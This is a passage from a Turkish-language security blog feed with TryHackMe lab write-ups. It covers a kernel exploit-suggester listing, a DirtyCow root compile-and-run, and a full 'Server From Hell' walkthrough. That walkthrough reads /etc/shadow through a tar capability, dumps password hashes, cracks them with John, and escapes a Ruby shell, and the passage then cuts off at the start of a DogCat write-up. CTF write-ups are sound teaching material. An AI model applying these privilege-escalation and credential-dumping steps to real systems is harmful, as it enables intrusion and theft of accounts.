   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2015-9322] BadIRET

   Details: http://labs.bromium.com/2015/02/02/exploiting-badiret-vulnerability-cve-2014-9322-linux-kernel-privilege-escalation/
   Exposure: less probable
   Tags: RHEL&lt;=7,fedora=20
   Download URL: http://site.pi3.com.pl/exp/p_cve-2014-9322.tar.gz

[+] [CVE-2015-8660] overlayfs (ovl_setattr)

   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/39230

[+] [CVE-2015-3290] espfix64_NMI

   Details: http://www.openwall.com/lists/oss-security/2015/08/04/8
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/37722

[+] [CVE-2014-5207] fuse_suid

   Details: https://www.exploit-db.com/exploits/34923/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/34923

[+] [CVE-2014-4014] inode_capable

   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
   Exposure: less probable
   Tags: ubuntu=12.04
   Download URL: https://www.exploit-db.com/download/33824

[+] [CVE-2014-0196] rawmodePTY

   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/33516

[+] [CVE-2014-0038] timeoutpwn

   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
   Exposure: less probable
   Tags: ubuntu=13.10
   Download URL: https://www.exploit-db.com/download/31346
   Comments: CONFIG_X86_X32 needs to be enabled

[+] [CVE-2014-0038] timeoutpwn 2

   Details: http://blog.includesecurity.com/2014/03/exploit-CVE-2014-0038-x32-recvmmsg-kernel-vulnerablity.html
   Exposure: less probable
   Tags: ubuntu=(13.04|13.10){kernel:3.(8|11).0-(12|15|19)-generic}
   Download URL: https://www.exploit-db.com/download/31347
   Comments: CONFIG_X86_X32 needs to be enabled

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working
</code></pre><p>Epey bir uzun Ã§Ä±ktÄ± vermektedir. Burada yer alan tÃ¼m explotler hedef sistemde Ã§alÄ±ÅŸmaya bilmektedir. BazÄ± aÃ§Ä±klar path edilmiÅŸ olabilmektedir. En dikkat Ã§eken aÃ§Ä±k ilk sÄ±rada yer alan ve epey meÅŸhur olan DirtyCow&rsquo;dur. <em>(DirtyCow hakkÄ±nda daha fazla bilgi iÃ§in <a href="https://canyoupwn.me/tr-dirtycow/">https://canyoupwn.me/tr-dirtycow/</a>)</em></p>
<p>DirtyCow kullanÄ±larak yetki yÃ¼kseltmemizi saÄŸlayacak olan <a href="https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679">CowRoot.c</a> dosyasÄ± indirilir. Hedef sistemde derlenerek Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r.</p>
<pre><code>gcc dirtycow.c -o root -pthread
./root
</code></pre>
    <img src="/images/thm/0Day/priv.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>/root dizini altÄ±nda yer alan root.txt dosyasÄ± okunarak makina Ã§Ã¶zÃ¼mÃ¼ tamamlanÄ±r.</p>

    <img src="/images/thm/0Day/rootflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 6px;"  />


<p>UmarÄ±m faydalÄ± olmuÅŸtur. BaÅŸka bir Ã§Ã¶zÃ¼mde gÃ¶rÃ¼ÅŸmek Ã¼zere Allah&rsquo;a emanet olun&hellip;</p>
]]></content>
        </item>
        
        <item>
            <title>THM The Server From Hell Write Up</title>
            <link>https://barcode91.github.io/posts/2020/11/thm-the-server-from-hell-write-up/</link>
            <pubDate>Wed, 04 Nov 2020 21:49:09 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/11/thm-the-server-from-hell-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki The Server From Hell adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&amp;hellip;
1. KeÅŸif AÅŸamasÄ± Nmap ile port taramasÄ± yapÄ±ldÄ±ÄŸÄ±nda tÃ¼m portlarÄ±n aÃ§Ä±k olduÄŸu gÃ¶rÃ¼lmektedir.ğŸ˜¥ Makina tasarÄ±mcÄ±sÄ± tarafÄ±ndan keÅŸif iÅŸlemine 1337 numaralÄ± port ile baÅŸlamamÄ±z sÃ¶ylenmektedir. Telnet ile porta baÄŸlantÄ± saÄŸlanÄ±r.
telnet 10.10.225.52 1337  BaÄŸlantÄ± ile ilgili ipucunun ilk 100 portta yer aldÄ±ÄŸÄ± ve tespit iÃ§in bannerlarÄ±n yazdÄ±rÄ±larak bulunabileceÄŸi belirtilmiÅŸtir. (Bir ÅŸu trollface meselesi var.</description>
            <content type="html"><![CDATA[<p><em>Merhaba, Bu yazÄ±mda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/theserverfromhell">The Server From Hell</a> adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&hellip;</em></p>
<h2 id="1-keÅŸif-aÅŸamasÄ±">1. KeÅŸif AÅŸamasÄ±</h2>
<p>Nmap ile port taramasÄ± yapÄ±ldÄ±ÄŸÄ±nda tÃ¼m portlarÄ±n aÃ§Ä±k olduÄŸu gÃ¶rÃ¼lmektedir.ğŸ˜¥ Makina tasarÄ±mcÄ±sÄ± tarafÄ±ndan keÅŸif iÅŸlemine 1337 numaralÄ± port ile baÅŸlamamÄ±z sÃ¶ylenmektedir. Telnet ile porta baÄŸlantÄ± saÄŸlanÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">telnet 10.10.225.52 <span style="color:#ae81ff">1337</span>
</code></pre></div>
    <img src="/images/thm/theserverfromhell/telnet.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>BaÄŸlantÄ± ile ilgili ipucunun ilk 100 portta yer aldÄ±ÄŸÄ± ve tespit iÃ§in bannerlarÄ±n yazdÄ±rÄ±larak bulunabileceÄŸi belirtilmiÅŸtir. (Bir ÅŸu trollface meselesi var. Beni en Ã§ok uÄŸraÅŸtÄ±ran kÄ±smÄ± bu oldu. Bulunca bir aydÄ±nlanma yaÅŸamadÄ±m deÄŸil tabi&hellip;)</p>
<p>Bu aÅŸamadan sonra banner tespiti iÃ§in nmap&rsquo;in banner scripti kullanÄ±labilir. Ben burada nc ile ilk yÃ¼z porta sÄ±ra ile baÄŸlantÄ± denemeleri yaparak banner tespiti yaptÄ±m.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -v 10.10.225.52 1-100
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 49 (tacacs) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 48 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 47 (?) open
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff0010.10.225.52 [10.10.225.52] 46 (?) open
550 12345 0ffffffffffffffffffffffffffffffffff7788888887ffffffff0010.10.225.52 [10.10.225.52] 45 (?) open
550 12345 0ffffffffffffffffffffffffffffffc880000000000008ffffff0010.10.225.52 [10.10.225.52] 44 (?) open
550 12345 0fffffffffffffffffffffffff7878000000000000000000cffff0010.10.225.52 [10.10.225.52] 43 (whois) open
550 12345 0fffffffffffffffffffffff7800000000000008888000008ffff0010.10.225.52 [10.10.225.52] 42 (?) open
550 12345 0fffffffffffffffffffffc800000000000000000088800007fff0010.10.225.52 [10.10.225.52] 41 (?) open
550 12345 0fffffffffffffffffff700008888800000000088000080007fff0010.10.225.52 [10.10.225.52] 40 (?) open
550 12345 0fffffffffffffffff70008878800000000000008878008007fff0010.10.225.52 [10.10.225.52] 39 (?) open
550 12345 0fffffffffffffff800888880000000000000000000800800cfff0010.10.225.52 [10.10.225.52] 38 (?) open
550 12345 0fffffffffffff7088888800008777ccf77fc777800000000ffff0010.10.225.52 [10.10.225.52] 37 (time) open
550 12345 0fffffffffffc8088888008cffffff7887f87ffffff800000ffff0010.10.225.52 [10.10.225.52] 36 (?) open
550 12345 0ffffffffff7088808008fff80008f0008c00770f78ff0008ffff0010.10.225.52 [10.10.225.52] 35 (?) open
550 12345 0fffffffff800000008fff7000008f0000f808f0870cf7008ffff0010.10.225.52 [10.10.225.52] 34 (?) open
550 12345 0ffffffff800000007f708f000000c0888ff78f78f777c008ffff0010.10.225.52 [10.10.225.52] 33 (?) open
550 12345 0fffffff70000000ff8000c700087fffffffffffffffcf808ffff0010.10.225.52 [10.10.225.52] 32 (?) open
550 12345 0cccccff0000000ff000008c8cffffffffffffffffffff807ffff0010.10.225.52 [10.10.225.52] 31 (?) open
550 12345 0ffffcf7000000cfc00008fffff777f7777f777fffffff707ffff0010.10.225.52 [10.10.225.52] 30 (?) open
550 12345 0ffffff8000007f0780cffff700000c000870008f07fff707ffff0010.10.225.52 [10.10.225.52] 29 (?) open
550 12345 0fffff7000008f00fffff78f800008f887ff880770778f708ffff0010.10.225.52 [10.10.225.52] 28 (?) open
550 12345 0ffffc000000f80fff700007787cfffc7787fffff0788f708ffff0010.10.225.52 [10.10.225.52] 27 (?) open
550 12345 0fff70000007fffcf700008ffc778000078000087ff87f700ffff0010.10.225.52 [10.10.225.52] 26 (?) open
550 12345 0ff70800008ff800f007fff70880000087f70000007fcf7007fff0010.10.225.52 [10.10.225.52] 25 (smtp) open
550 12345 0ff0808800cf0000ffff70000f877f70000c70008008ff8088fff0010.10.225.52 [10.10.225.52] 24 (?) open
550 12345 0f7000f888f8007ff7800000770877800000cf780000ff00807ff0010.10.225.52 [10.10.225.52] 23 (telnet) open
550 12345 0f8008707ff07ff8000008088ff800000000f7000000f800808ff0010.10.225.52 [10.10.225.52] 22 (ssh) open
550 12345 0f8008c008fff8000000000000780000007f800087708000800ff0010.10.225.52 [10.10.225.52] 21 (ftp) open
550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf0010.10.225.52 [10.10.225.52] 20 (ftp-data) open
550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf0010.10.225.52 [10.10.225.52] 19 (chargen) open
550 12345 0ff70008fc77f7000000f80008f8000007f0000000000000888ff0010.10.225.52 [10.10.225.52] 18 (?) open
550 12345 0fff78000878000077800887fc8f80007fffc7778800000880cff0010.10.225.52 [10.10.225.52] 17 (qotd) open
550 12345 0fffff7880000780f7cffff7800f8000008fffffff80808807fff0010.10.225.52 [10.10.225.52] 16 (?) open
550 12345 0ffffff8000000008ffffff007f8000000007cf7c80000007ffff0010.10.225.52 [10.10.225.52] 15 (netstat) open
550 12345 0ffffff70000000008cffffffc0000000080000000000008fffff0010.10.225.52 [10.10.225.52] 14 (?) open
550 12345 0fffffff8000000000008888000000000080000000000007fffff0010.10.225.52 [10.10.225.52] 13 (daytime) open
550 12345 0ffffffff000000888000000000800000080000008800007fffff0010.10.225.52 [10.10.225.52] 12 (?) open
550 12345 0ffffffff80008808880000000880000008880088800008ffffff0010.10.225.52 [10.10.225.52] 11 (systat) open
550 12345 0fffffffff000088808880000000000000088800000008fffffff0010.10.225.52 [10.10.225.52] 10 (?) open
550 12345 0fffffffff70000088800888800088888800008800007ffffffff0010.10.225.52 [10.10.225.52] 9 (discard) open
550 12345 0ffffffffff80000088808000000888800000008887ffffffffff0010.10.225.52 [10.10.225.52] 8 (?) open
550 12345 0fffffffffff8000000000000000008888887cfcfffffffffffff0010.10.225.52 [10.10.225.52] 7 (echo) open
550 12345 0fffffffffffff777778887777777777cffffffffffffffffffff0010.10.225.52 [10.10.225.52] 6 (?) open
550 12345 0ffffffffffffffffffffffffffffffffffffffffffffffffffff0010.10.225.52 [10.10.225.52] 5 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 4 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 3 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 2 (?) open
550 12345 000000000000000000000000000000000000000000000000000000010.10.225.52 [10.10.225.52] 1 (tcpmux) open
550 12345 0000000000000000000000000000000000000000000000000000000â”€
</code></pre></div><p>Dikkatli bakÄ±nca 21. porttan dÃ¶nen cevapta 12345 numaralÄ± porta gidilmesi sÃ¶ylenmiÅŸtir. AyrÄ±ca bizim trollface de baÅŸ aÅŸaÄŸÄ± gÃ¶rÃ¼lmektedir. AÅŸaÄŸÄ±da sizler iÃ§in dÃ¼zeltilmiÅŸ hali yer almaktadÄ±r. ğŸ˜œ</p>

    <img src="/images/thm/theserverfromhell/trollface.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p><strong>Telnet</strong> ile 12345 portuna baÄŸlantÄ± saÄŸlanÄ±lÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">telnet 10.10.225.52 <span style="color:#ae81ff">12345</span>
</code></pre></div>
    <img src="/images/thm/theserverfromhell/12345.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>NFS ile ilgili bir ikaz yer almaktadÄ±r. <em><strong>Showmount</strong></em> aracÄ± ile sistemde nfs ile bir dosya paylaÅŸÄ±mÄ± yapÄ±lÄ±p yapÄ±lmadÄ±ÄŸÄ± kontrol edilir.</p>
<pre><code>showmount -e 10.10.225.52
</code></pre>
    <img src="/images/thm/theserverfromhell/nfss.png"  alt="Hello Friend"  class="center"  style="border-radius: 4px;"  />


<p>PaylaÅŸÄ±ma aÃ§Ä±k olan <em><strong>/home/nfs</strong></em> dizini localhosta mount edilerek paylaÅŸÄ±m gÃ¶rÃ¼ntÃ¼lenir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo mkdir /tmp/mnt
sudo mount -t nfs 10.10.225.52:/home/nfs /tmp/mnt/ 
</code></pre></div><p>Localhostta <em><strong>/tmp/mnt/</strong></em> dizinine gidilerek dizin listelendiÄŸinde backup.zip adÄ±nda bir dosya tespit edilir. Dosya /tmp dizinine aÃ§Ä±lmaya Ã§alÄ±ÅŸÄ±ldÄ±ÄŸÄ±nda parola korumasÄ± olduÄŸu gÃ¶rÃ¼lÃ¼r.</p>

    <img src="/images/thm/theserverfromhell/backup.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>Zip dosyasÄ±nÄ±n parola hash bilgisi <em><strong>zip2john</strong></em> aracÄ± ile Ã§Ä±karÄ±lÄ±r ve <em><strong>john</strong></em> ile sÃ¶zlÃ¼k saldÄ±rÄ±sÄ± yapÄ±larak parola elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">zip2john backup.zip &gt; ../hash

john -wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt ../hash 
Using default input encoding: UTF-8
Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>PKZIP <span style="color:#f92672">[</span>32/64<span style="color:#f92672">])</span>
Will run <span style="color:#ae81ff">2</span> OpenMP threads
Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
zxcvbnm          <span style="color:#f92672">(</span>backup.zip<span style="color:#f92672">)</span>
1g 0:00:00:00 DONE <span style="color:#f92672">(</span>2020-11-04 11:28<span style="color:#f92672">)</span> 33.33g/s 136533p/s 136533c/s 136533C/s 123456..oooooo
Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session completed
</code></pre></div><p><em><strong>Unzip</strong></em> ile dosya aÃ§Ä±lÄ±r.</p>

    <img src="/images/thm/theserverfromhell/unzip.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>Ä°lk flag dosyasÄ± okunur.</p>

    <img src="/images/thm/theserverfromhell/flag1.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>Hades kullanÄ±cÄ±sna ait ssh anahtarlarÄ± gÃ¶rÃ¼lmektedir. Hades kullanÄ±cÄ±na ait private anahtar kullanÄ±larak ssh baÄŸlantÄ±sÄ± saÄŸlanÄ±lÄ±r. Ssh baÄŸlantÄ±sÄ± iÃ§in aÃ§Ä±k port bulmak gerekmektedir. <em><strong>hint.txt</strong></em> dosyasÄ±na bakÄ±ldÄ±ÄŸÄ±nda <em>2500-4500</em> port aralÄ±ÄŸÄ± verilmiÅŸtir. Nmap ile aralÄ±ktaki portlar taranÄ±r.</p>
<pre><code>nmap -sV -p2500-4500 10.10.225.52 
</code></pre><p>Elde edilen Ã§Ä±ktÄ±da ssh aramasÄ± yapÄ±lÄ±r. Tespit edilen portlara baÄŸlantÄ± denemeleri yapÄ±ldÄ±ÄŸÄ±nda 3333 numaralÄ± portun aÃ§Ä±k olduÄŸu gÃ¶rÃ¼lmektedir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">3333/tcp open  dec-notes
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
</code></pre></div><h2 id="2-eriÅŸim-saÄŸlanmasÄ±">2. EriÅŸim SaÄŸlanmasÄ±</h2>
<p>Hades kullanÄ±cÄ±sa ait ssh anahtarÄ± kullanÄ±larak <em>3333</em> numaralÄ± porttan ssh baÄŸlantÄ±sÄ± saÄŸlanÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh -i .ssh/id_rsa -p <span style="color:#ae81ff">3333</span> root@10.10.225.52
</code></pre></div>
    <img src="/images/thm/theserverfromhell/ssh.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p><em><strong>irb</strong></em> adlÄ± bir uygulamaya baÄŸlanÄ±lmÄ±ÅŸtÄ±r. YapÄ±lan araÅŸtÄ±rmada interaktif ruby yorumlayÄ±cÄ±sÄ± olduÄŸu tespit edilir. <code>exec '/bin/bash'</code> komutu bash kabuÄŸuna geÃ§ilir.</p>

    <img src="/images/thm/theserverfromhell/bash.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>User.txt dosyasÄ± okunarak ikinci flag elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">cat user.txt
thm{sh3ll_3c4p3_15_v3ry_1337}
</code></pre></div><h2 id="3-yetki-yÃ¼kseltme">3. Yetki YÃ¼kseltme</h2>
<p>Yetki yÃ¼kseltmek iÃ§in LinEnum.sh betiÄŸi hedef makinaya yÃ¼klenir. Betik Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda <em><strong>getcap</strong></em> Ã§Ä±ktÄ±sÄ± dikkat Ã§ekmektedir.</p>

    <img src="/images/thm/theserverfromhell/priv.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p><em>Tar uygulamasÄ± iÃ§in okuma (read) yetkisinin root yetkisi (ep) ile yapÄ±labileceÄŸi gÃ¶rÃ¼lmektedir.</em> Flag dosyasÄ±nÄ± elde etmek iÃ§in direk /root dizini arÅŸivlenir ve sÄ±kÄ±ÅŸtÄ±rÄ±lan dosya aÃ§Ä±larak makina Ã§Ã¶zÃ¼mÃ¼ tamamlanÄ±r.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">###Compress</span>

hades@hell:/tmp/etc$ /bin/tar -cvf root.tar /root
/bin/tar: Removing leading <span style="color:#e6db74">`</span>/<span style="color:#960050;background-color:#1e0010">&#39;</span> from member names
/root/
/root/.gnupg/
/root/.gnupg/private-keys-v1.d/
/root/.bashrc
/root/root.txt
/root/.bash_history
/root/.ssh/
/root/.ssh/authorized_keys
/root/.cache/
/root/.cache/motd.legal-displayed
/root/.profile

<span style="color:#75715e">###Decompress</span>
hades@hell:/tmp/etc$ ls
root.tar  shadow

hades@hell:/tmp/etc$ tar -xvf root.tar 
root/
root/.gnupg/
root/.gnupg/private-keys-v1.d/
root/.bashrc
root/root.txt
root/.bash_history
root/.ssh/
root/.ssh/authorized_keys
root/.cache/
root/.cache/motd.legal-displayed
root/.profile
</code></pre></div>
    <img src="/images/thm/theserverfromhell/root.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


<p>Root yetkisi elde etmek iÃ§in <em><strong>shadow</strong></em> dosyasÄ± arÅŸivlenerek okunur. Daha sonra <em><strong>passwd</strong></em> dosyasÄ± okunur.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
cat shadow 

root:$6$gOnbjpUs$c0IEFcbrGocU26kyzzPOqzY02e7bcawNexPsEm3oENaBIw7mVz/h9dOgaDaphveFY9ScIetMiI8F/XOnTxJxi1:18520:0:99999:7:::
daemon:*:18513:0:99999:7:::
bin:*:18513:0:99999:7:::
sys:*:18513:0:99999:7:::
sync:*:18513:0:99999:7:::
games:*:18513:0:99999:7:::
man:*:18513:0:99999:7:::
lp:*:18513:0:99999:7:::
mail:*:18513:0:99999:7:::
news:*:18513:0:99999:7:::
uucp:*:18513:0:99999:7:::
proxy:*:18513:0:99999:7:::
www-data:*:18513:0:99999:7:::
backup:*:18513:0:99999:7:::
list:*:18513:0:99999:7:::
irc:*:18513:0:99999:7:::
gnats:*:18513:0:99999:7:::
nobody:*:18513:0:99999:7:::
systemd-network:*:18513:0:99999:7:::
systemd-resolve:*:18513:0:99999:7:::
syslog:*:18513:0:99999:7:::
messagebus:*:18513:0:99999:7:::
_apt:*:18513:0:99999:7:::
lxd:*:18513:0:99999:7:::
uuidd:*:18513:0:99999:7:::
dnsmasq:*:18513:0:99999:7:::
landscape:*:18513:0:99999:7:::
sshd:*:18513:0:99999:7:::
pollinate:*:18513:0:99999:7:::
vagrant:$6$XQAwkysB$wSkezwLStg6E8nT/h5ECcNdiBuGt98yNnjwVEB.YVEAQY9z5AamgBhYTUAzKRQjmNxpEOLP/a36mxdZyaKJk60:18513:0:99999:7:::
ubuntu:!:18520:0:99999:7:::
statd:*:18520:0:99999:7:::
ntp:*:18520:0:99999:7:::
hades:*:18520:0:99999:7:::

---------------------------------------------------------------

cat /etc/passwd

rootâŒ0:0:root:/root:/bin/bash
daemonâŒ1:1:daemon:/usr/sbin:/usr/sbin/nologin
binâŒ2:2:bin:/bin:/usr/sbin/nologin
sysâŒ3:3:sys:/dev:/usr/sbin/nologin
syncâŒ4:65534:sync:/bin:/bin/sync
gamesâŒ5:60:games:/usr/games:/usr/sbin/nologin
manâŒ6:12:man:/var/cache/man:/usr/sbin/nologin
lpâŒ7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mailâŒ8:8:mail:/var/mail:/usr/sbin/nologin
newsâŒ9:9:news:/var/spool/news:/usr/sbin/nologin
uucpâŒ10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxyâŒ13:13:proxy:/bin:/usr/sbin/nologin
www-dataâŒ33:33:www-data:/var/www:/usr/sbin/nologin
backupâŒ34:34:backup:/var/backups:/usr/sbin/nologin
listâŒ38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
ircâŒ39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnatsâŒ41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobodyâŒ65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-networkâŒ100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolveâŒ101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslogâŒ102:106::/home/syslog:/usr/sbin/nologin
messagebusâŒ103:107::/nonexistent:/usr/sbin/nologin
_aptâŒ104:65534::/nonexistent:/usr/sbin/nologin
lxdâŒ105:65534::/var/lib/lxd/:/bin/false
uuiddâŒ106:110::/run/uuidd:/usr/sbin/nologin
dnsmasqâŒ107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscapeâŒ108:112::/var/lib/landscape:/usr/sbin/nologin
sshdâŒ109:65534::/run/sshd:/usr/sbin/nologin
pollinateâŒ110:1::/var/cache/pollinate:/bin/false
vagrantâŒ1000:1000:,,,:/home/vagrant:/bin/bash
ubuntuâŒ1001:1001:Ubuntu:/home/ubuntu:/bin/bash
statdâŒ111:65534::/var/lib/nfs:/usr/sbin/nologin
ntpâŒ112:116::/nonexistent:/usr/sbin/nologin
hadesâŒ1002:1002:0,0,0,0:/home/hades:/usr/bin/irb
</code></pre></div><p><em><strong>Unshadow</strong></em> <em>aracÄ± kullanÄ±larak hesaplara ait hash bilgileri john ile kÄ±rÄ±lmak Ã¼zere hazÄ±r hale getirilir.</em></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">unshadow passwd shadow &gt; crackhash
</code></pre></div><p>John aracÄ± kullanÄ±larak root parolasÄ± elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">â”€<span style="color:#f92672">[</span>barcode@parrot<span style="color:#f92672">]</span>â”€<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>$ john -wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt crackhash 
Using default input encoding: UTF-8
Loaded <span style="color:#ae81ff">2</span> password hashes with <span style="color:#ae81ff">2</span> different salts <span style="color:#f92672">(</span>sha512crypt, crypt<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span> $6$ <span style="color:#f92672">[</span>SHA512 256/256 AVX2 4x<span style="color:#f92672">])</span>
Cost <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>iteration count<span style="color:#f92672">)</span> is <span style="color:#ae81ff">5000</span> <span style="color:#66d9ef">for</span> all loaded hashes
Will run <span style="color:#ae81ff">2</span> OpenMP threads
Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
trustno1         <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
1g 0:00:00:06 0.07% <span style="color:#f92672">(</span>ETA: 14:56:04<span style="color:#f92672">)</span> 0.1494g/s 1798p/s 1951c/s 1951C/s 123qaz..hawkeye
Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
Session aborted
</code></pre></div><p>Root hesabÄ±yla ssh baÄŸlantÄ±sÄ± saÄŸlanÄ±r.</p>

    <img src="/images/thm/theserverfromhell/root2.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />


]]></content>
        </item>
        
        <item>
            <title>THM Dogcat Write Up</title>
            <link>https://barcode91.github.io/posts/2020/10/thm-dogcat-write-up/</link>
            <pubDate>Wed, 14 Oct 2020 21:45:22 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/10/thm-dogcat-write-up/</guid>
            <description>Merhaba, Bu yazÄ±mda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki DogCat adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&amp;hellip;
1. KeÅŸif AÅŸamasÄ± Nmap ile makinenin aÃ§Ä±k portlarÄ± ve portlarda Ã§alÄ±ÅŸan servisleri tespit edilir.
sudo nmap -sV -sC 10.10.35.38  Sistemde sadece 2 port aÃ§Ä±ktÄ±r. Web sayfasÄ±na giriÅŸ yapÄ±lÄ±r. Anasayfada yer alan dog ve cat butonlarÄ±na tÄ±klanarak adres Ã§ubuÄŸuna dikkatle bakÄ±lÄ±r.
 LFI zafiyeti kontrolÃ¼ iÃ§in /etc/passwd dosyasÄ± okunmaya Ã§alÄ±ÅŸÄ±lÄ±r.
Dog ve cat dÄ±ÅŸÄ±ndaki dosyalar filtreye takÄ±lÄ±maktadÄ±r.</description>
            <content type="html"><![CDATA[<p><em>Merhaba, Bu yazÄ±mda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/dogcat">DogCat</a> adlÄ± makinanÄ±n Ã§Ã¶zÃ¼mÃ¼nden bahsedeceÄŸim. Keyifli okumalar&hellip;</em></p>
